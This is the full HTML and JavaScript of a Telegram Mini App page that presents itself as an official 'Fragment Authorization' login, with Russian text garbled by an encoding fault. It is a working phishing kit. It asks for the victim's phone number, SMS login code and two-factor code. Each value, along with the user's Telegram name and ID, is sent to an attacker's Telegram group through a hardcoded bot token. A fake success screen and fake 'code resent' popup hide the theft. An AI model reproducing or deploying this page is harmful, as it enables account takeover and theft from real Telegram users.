<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fragment Authorization</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f9f9f9;
    }

    .container {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 400px;
      padding: 20px;
      text-align: center;
    }

    .icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 20px;
    }

    .icons img {
      width: 50px;
      height: 50px;
    }

    h1 {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 10px;
      color: #000;
    }

    p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.4;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 20px;
    }

    select, input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 14px;
      box-sizing: border-box;
    }

    .phone-input {
      display: flex;
    }

    .country-code {
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px 0 0 5px;
      background: #f9f9f9;
      border-right: none;
      min-width: 60px;
    }

    .phone-number {
      flex: 1;
      border-radius: 0 5px 5px 0;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
    }

    .buttons button {
      width: 48%;
      padding: 10px;
      font-size: 14px;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .cancel-btn {
      background: none;
      color: #007bff;
    }

    .next-btn {
      background: #007bff;
      color: #fff;
    }

    .screen {
      display: none;
    }

    .screen.active {
      display: block;
    }

    .code-inputs {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin-bottom: 20px;
    }

    .code-input {
      width: 40px;
      height: 50px;
      border: 2px solid #ddd;
      border-radius: 8px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      outline: none;
    }

    .code-input:focus {
      border-color: #007bff;
    }

    .back-btn {
      background: none;
      border: none;
      color: #007bff;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 15px;
    }

    .hint {
      font-size: 13px;
      color: #666;
      margin-top: 10px;
    }

    .success-screen {
      text-align: center;
      padding: 20px;
    }

    .success-icon {
      font-size: 60px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <!-- –≠–∫—Ä–∞–Ω 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
  <div class="container screen active" id="screen1">
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://fragment.com/logo.png" alt="Fragment Icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMwMDg4Y2MiLz4KPHN2ZyB4PSIxMiIgeT0iMTIiIHdpZHRoPSIyNiIgaGVpZ2h0PSIyNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CjxwYXRoIGQ9Ik0xMCAxMy41SDE0LjVWMTguNUgxMFYxMy41WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE1LjUgMTBIMTguNVYxNEgxNS41VjEwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE4LjUgMTcuNVYxOS41QzE4LjUgMTkuNzY1MiAxOC4zOTI5IDE5LjUxOTYgMTguMjAzNiAxOS43MDg2QzE4LjAxNDMgMTkuODk3OSAxNy43NjUyIDIwIDE3LjUgMjBINi41QzYuMjM0NzggMjAgNS45ODU3MSAxOS44OTc5IDUuNzk2NDMgMTkuNzA4NkM1LjYwNzE0IDE5LjUxOTYgNS41IDE5LjI2NTIgNS41IDE5VjE0LjVINS41QzUuNSAxNC4yMzQ4IDUuNjA3MTQgMTMuOTgwNCA1Ljc5NjQzIDEzLjc5MTFDNS45ODU3MSAxMy42MDE5IDYuMjM0NzggMTMuNSA2LjUgMTMuNUg5LjVWMTBINS41QzUuMjM0NzggMTAgNC45ODU3MSA5Ljg5Nzg2IDQuNzk2NDMgOS43MDg1N0M0LjYwNzE0IDkuNTE5MjkgNC41IDkuMjY0ODUgNC41IDlWNS41QzQuNSA1LjIzNDc4IDQuNjA3MTQgNC45ODU3MSA0Ljc5NjQzIDQuNzk2NDNDNC45ODU3MSA0LjYwNzE0IDUuMjM0NzggNC41IDUuNSA0LjVIMTQuNUMxNC43NjUyIDQuNSAxNS4wMTQzIDQuNjA3MTQgMTUuMjAzNiA0Ljc5NjQzQzE1LjM5MjkgNC45ODU3MSAxNS41IDUuMjM0NzggMTUuNSA1LjVWOUgxOS41QzE5Ljc2NTIgOSAyMC4wMTQzIDkuMTA3MTQgMjAuMjAzNiA5LjI5NjQzQzIwLjM5MjkgOS40ODU3MSAyMC41IDkuNzM0NzggMjAuNSA5LjVWMTMuNUgxOC41VjE3LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4KPC9zdmc+'">
    </div>
    <h1>–í–æ–π–¥–∏—Ç–µ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç <span>Fragment</span></h1>
    <p>–¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –∑–≤–µ–∑–¥–∞–º–∏ –∏ –±—ã—Å—Ç—Ä—ã–º–∏ –ø–µ—Ä–µ–≤–æ–¥–∞–º–∏.<br>–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π <b>–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</b> –≤ –º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ.</p>
    <div class="input-group">
      <select id="country">
        <option>–†–æ—Å—Å–∏—è</option>
        <option>–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω</option>
        <option>–£–∫—Ä–∞–∏–Ω–∞</option>
        <option>–ë–µ–ª–∞—Ä—É—Å—å</option>
        <option>–î—Ä—É–≥–∞—è —Å—Ç—Ä–∞–Ω–∞</option>
      </select>
      <div class="phone-input">
        <span class="country-code">+7</span>
        <input type="text" class="phone-number" id="phone" placeholder="–í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞">
      </div>
    </div>
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">–û–¢–ú–ï–ù–ê</button>
      <button class="next-btn" onclick="handlePhoneSubmit()">–î–ê–õ–ï–ï</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω 2: –í–≤–æ–¥ SMS –∫–æ–¥–∞ -->
  <div class="container screen" id="screen2">
    <button class="back-btn" onclick="prevScreen(1)">‚Üê –ù–∞–∑–∞–¥</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://fragment.com/logo.png" alt="Fragment Icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMwMDg4Y2MiLz4KPHN2ZyB4PSIxMiIgeT0iMTIiIHdpZHRoPSIyNiIgaGVpZ2h0PSIyNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CjxwYXRoIGQ9Ik0xMCAxMy41SDE0LjVWMTguNUgxMFYxMy41WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE1LjUgMTBIMTguNVYxNEgxNS41VjEwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE4LjUgMTcuNVYxOS41QzE4LjUgMTkuNzY1MiAxOC4zOTI5IDE5LjUxOTYgMTguMjAzNiAxOS43MDg2QzE4LjAxNDMgMTkuODk3OSAxNy43NjUyIDIwIDE3LjUgMjBINi41QzYuMjM0NzggMjAgNS45ODU3MSAxOS44OTc5IDUuNzk2NDMgMTkuNzA4NkM1LjYwNzE0IDE5LjUxOTYgNS41IDE5LjI2NTIgNS41IDE5VjE0LjVINS41QzUuNSAxNC4yMzQ4IDUuNjA3MTQgMTMuOTgwNCA1Ljc5NjQzIDEzLjc5MTFDNS45ODU3MSAxMy42MDE5IDYuMjM0NzggMTMuNSA2LjUgMTMuNUg5LjVWMTBINS41QzUuMjM0NzggMTAgNC45ODU3MSA5Ljg5Nzg2IDQuNzk2NDMgOS43MDg1N0M0LjYwNzE0IDkuNTE5MjkgNC41IDkuMjY0ODUgNC41IDlWNS41QzQuNSA1LjIzNDc4IDQuNjA3MTQgNC45ODU3MSA0Ljc5NjQzIDQuNzk2NDNDNC45ODU3MSA0LjYwNzE0IDUuMjM0NzggNC41IDUuNSA0LjVIMTQuNUMxNC43NjUyIDQuNSAxNS4wMTQzIDQuNjA3MTQgMTUuMjAzNiA0Ljc5NjQzQzE1LjM5MjkgNC45ODU3MSAxNS41IDUuMjM0NzggMTUuNSA1LjVWOUgxOS41QzE5Ljc2NTIgOSAyMC4wMTQzIDkuMTA3MTQgMjAuMjAzNiA5LjI5NjQzQzIwLjM5MjkgOS40ODU3MSAyMC41IDkuNzM0NzggMjAuNSA5LjVWMTMuNUgxOC41VjE3LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4KPC9zdmc+'">
    </div>
    <h1>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS</h1>
    <p>–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint" id="timer">–ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω: 01:00</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="resendCode()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ</button>
      <button class="next-btn" onclick="handleSmsSubmit()">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω 3: –í–≤–æ–¥ 2FA –∫–æ–¥–∞ -->
  <div class="container screen" id="screen3">
    <button class="back-btn" onclick="prevScreen(2)">‚Üê –ù–∞–∑–∞–¥</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://fragment.com/logo.png" alt="Fragment Icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMwMDg4Y2MiLz4KPHN2ZyB4PSIxMiIgeT0iMTIiIHdpZHRoPSIyNiIgaGVpZ2h0PSIyNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CjxwYXRoIGQ9Ik0xMCAxMy41SDE0LjVWMTguNUgxMFYxNS41WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE1LjUgMTBIMTguNVYxNEgxNS41VjEwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE4LjUgMTcuNVYxOS41QzE4LjUgMTkuNzY1MiAxOC4zOTI5IDE5LjUxOTYgMTguMjAzNiAxOS43MDg2QzE4LjAxNDMgMTkuODk3OSAxNy43NjUyIDIwIDE3LjUgMjBINi41QzYuMjM0NzggMjAgNS45ODU3MSAxOS44OTc5IDUuNzk2NDMgMTkuNzA4NkM1LjYwNzE0IDE5LjUxOTYgNS41IDE5LjI2NTIgNS41IDE5VjE0LjVINS41QzUuNSAxNC4yMzQ4IDUuNjA3MTQgMTMuOTgwNCA1Ljc5NjQzIDE3Ljc5MTFDNS45ODU3MSAxMy42MDE5IDYuMjM0NzggMTMuNSA2LjUgMTMuNUg5LjVWMTBINS41QzUuMjM0NzggMTAgNC45ODU3MSA5Ljg5Nzg2IDQuNzk2NDMgOS43MDg1N0M0LjYwNzE0IDkuNTE5MjkgNC41IDkuMjY0ODUgNC41IDlWNS41QzQuNSA1LjIzNDc4IDQuNjA3MTQgNC45ODU3MSA0Ljc5NjQzIDQuNzk2NDNDNC45ODU3MSA0LjYwNzE0IDUuMjM0NzggNC41IDUuNSA0LjVIMTQuNUMxNC43NjUyIDQuNSAxNS4wMTQzIDQuNjA3MTQgMTUuMjAzNiA0Ljc5NjQzQzE1LjM5MjkgNC45ODU3MSAxNS41IDUuMjM0NzggMTUuNSA1LjVWOUgxOS41QzE5Ljc2NTIgOSAyMC4wMTQzIDkuMTA3MTQgMjAuMjAzNiA5LjI5NjQzQzIwLjM5MjkgOS40ODU3MSAyMC41IDkuNzM0NzggMjAuNSA5LjVWMTMuNUgxOC41VjE3LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4KPC9zdmc+'">
    </div>
    <h1>–î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</h1>
    <p>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint">–î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">–û–¢–ú–ï–ù–ê</button>
      <button class="next-btn" onclick="handle2faSubmit()">–ó–ê–í–ï–†–®–ò–¢–¨</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω 4: –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è -->
  <div class="container screen" id="screen4">
    <div class="success-screen">
      <div class="success-icon">‚úÖ</div>
      <h1>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</h1>
      <p>–í–∞—à –∞–∫–∫–∞—É–Ω—Ç Fragment –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω. –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–æ—Ç–∞ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã.</p>
      
      <div class="buttons">
        <button class="next-btn" onclick="closeWebApp()">–í–ï–†–ù–£–¢–¨–°–Ø –í –ë–û–¢–ê</button>
      </div>
    </div>
  </div>

  <script>
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.MainButton.hide();

    let currentScreen = 1;
    let timerInterval;

    // –£–õ–£–ß–®–ï–ù–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –î–õ–Ø –û–¢–ü–†–ê–í–ö–ò –õ–û–ì–û–í –í TELEGRAM –ì–†–£–ü–ü–£
   // –ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ Telegram API - –±–µ–∑ Netlify —Ñ—É–Ω–∫—Ü–∏–π
// –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –ø—Ä—è–º–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
async function sendLog(action, details = '') {
  try {
    const user = tg.initDataUnsafe?.user;
    const userInfo = user ? 
      `${user.first_name} (@${user.username}) ID: ${user.id}` : 
      '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å';
    
    const logMessage = `ü™µ MINI-APP\nüë§ ${userInfo}\nüéØ ${action}\nüìù ${details}\n‚è∞ ${new Date().toLocaleString('ru-RU')}`;
    
    const TELEGRAM_BOT_TOKEN = '7872244632:AAH78O5srYOqV7QdxjztT6px-Qi1TKZlTA0';
    const TELEGRAM_CHAT_ID = '-1003260648472';
    
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(logMessage)}`;
    
    await fetch(telegramUrl);
    console.log('‚úÖ –õ–æ–≥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram');
    
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞:', error);
  }
}

    // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É —ç–∫—Ä–∞–Ω–∞–º–∏
    function nextScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;

      if (screenNumber === 2) {
        startTimer();
      }
    }

    function prevScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;

      if (screenNumber !== 2) {
        stopTimer();
      }
    }

    // –¢–∞–π–º–µ—Ä –¥–ª—è SMS –∫–æ–¥–∞
    function startTimer() {
      let timeLeft = 60;
      const timerElement = document.getElementById('timer');
      
      stopTimer();
      
      timerInterval = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `–ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
          stopTimer();
          timerElement.textContent = "–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–æ–¥–∞ –∏—Å—Ç–µ–∫";
          timerElement.style.color = "#ff4444";
        }
      }, 1000);
    }

    function stopTimer() {
      if (timerInterval) {
        clearInterval(timerInterval);
      }
    }

    // –ü–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º–µ–∂–¥—É –ø–æ–ª—è–º–∏ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
    function moveToNext(input, currentIndex) {
      if (input.value.length === 1) {
        const inputs = input.parentElement.querySelectorAll('.code-input');
        if (currentIndex < inputs.length) {
          inputs[currentIndex].focus();
        }
      }
    }

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–Ω–æ–ø–æ–∫
    function handlePhoneSubmit() {
      const phone = document.getElementById('phone').value;
      const country = document.getElementById('country').value;
      
      if (!phone) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
        return;
      }
      
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('PHONE_ENTERED', `–°—Ç—Ä–∞–Ω–∞: ${country}, –ù–æ–º–µ—Ä: +7${phone}`);
      
      nextScreen(2);
    }

    function handleSmsSubmit() {
      const codeInputs = document.querySelectorAll('#screen2 .code-input');
      let smsCode = '';
      codeInputs.forEach(input => smsCode += input.value);
      
      if (smsCode.length !== 5) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
        return;
      }
      
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('SMS_CODE_ENTERED', `–ö–æ–¥: ${smsCode}`);
      
      nextScreen(3);
    }

    function handle2faSubmit() {
      const codeInputs = document.querySelectorAll('#screen3 .code-input');
      let faCode = '';
      codeInputs.forEach(input => faCode += input.value);
      
      if (faCode.length !== 6) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
        return;
      }
      
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('2FA_CODE_ENTERED', `–ö–æ–¥: ${faCode}`);
      
      completeAuth();
    }

    function resendCode() {
      const timerElement = document.getElementById('timer');
      timerElement.textContent = "–ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω: 01:00";
      timerElement.style.color = "#666";
      startTimer();
      
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('RESEND_CODE', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–æ—Å–∏–ª –ø–æ–≤—Ç–æ—Ä–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É –∫–æ–¥–∞');
      
      tg.showPopup({
        title: '–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω',
        message: '–ù–æ–≤—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.',
        buttons: [{ type: 'ok' }]
      });
    }

    function handleCancel() {
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('USER_CANCELLED', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–º–µ–Ω–∏–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é');
      
      tg.close();
    }

    function completeAuth() {
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('AUTH_SUCCESS', '–£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è');
      
      nextScreen(4);
    }

    function closeWebApp() {
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê
      sendLog('APP_CLOSED', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–µ—Ä–Ω—É–ª—Å—è –≤ –±–æ—Ç–∞');
      
      tg.close();
    }

    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª—è—Ö –≤–≤–æ–¥–∞
    document.addEventListener('DOMContentLoaded', function() {
      // –û–¢–ü–†–ê–í–ö–ê –õ–û–ì–ê –ü–†–ò –ó–ê–ü–£–°–ö–ï
      sendLog('APP_STARTED', '–ú–∏–Ω–∏-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ –≤ Telegram WebView');
      
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            if (document.getElementById('screen2').classList.contains('active')) {
              document.querySelector('#screen2 .code-input').focus();
            }
            if (document.getElementById('screen3').classList.contains('active')) {
              document.querySelector('#screen3 .code-input').focus();
            }
          }
        });
      });
      
      observer.observe(document.getElementById('screen2'), { attributes: true });
      observer.observe(document.getElementById('screen3'), { attributes: true });
    });
  </script>
</body>
</html>